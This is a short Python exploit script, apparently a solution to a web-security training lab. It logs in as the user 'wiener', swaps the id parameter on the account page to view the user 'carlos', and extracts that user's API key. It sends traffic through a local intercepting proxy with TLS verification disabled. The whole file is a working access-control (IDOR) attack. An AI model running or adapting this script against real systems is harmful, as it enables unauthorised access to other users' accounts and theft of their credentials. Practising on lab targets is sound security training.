import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http:' : 'http://127.0.0.1:8080', 'https:' : 'http://127.0.0.1:8080'}

def get_csrf(url,s):
    req = s.get(url,verify = False , proxies = proxies)
    soup = BeautifulSoup(req.text,'lxml')
    csrf = soup.find("input" , {'name' : 'csrf'})['value']
    return csrf


def deleteUsr(url,s):
    loginUrl = url + '/login'
    ## * get the csrf first from login url
    csrf = get_csrf(loginUrl,s)
    data = {
        'csrf':csrf,
        'username' : 'wiener',
        'password' : 'peter'
    }
    req = s.post(loginUrl,verify = False , proxies = proxies, data = data)
    res = req.text
    if "Log out" in res:
        print("(+) Successfuly logged in with wiener username")
        print("(+) Tring change the user id parameter...")
        carlosUrl = url + '/my-account?id=carlos'
        req = s.get(carlosUrl , proxies = proxies , verify = False)
        res = req.text
        if "carlos" in res:
            print("(+) Successfuly changed to carlos")
            print("(+) Tring to catch the API...")
            soup = BeautifulSoup(req.text, 'lxml')
            apiLine = soup.find(string=re.compile("Your API Key is:"))
            api_key = re.search(r"Your API Key is: (.*)", apiLine).group(1)
            print("Api Key is: %s" % api_key)


def main():
    if(len(sys.argv) != 2):
        print ("Usage: %s URL " % sys.argv[0].split("/")[0])
        print ("Example: %s www.example.com" % sys.argv[0].split("/")[0])
        sys.exit(-1)
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    deleteUsr(url,s)



if __name__ == '__main__':
    main()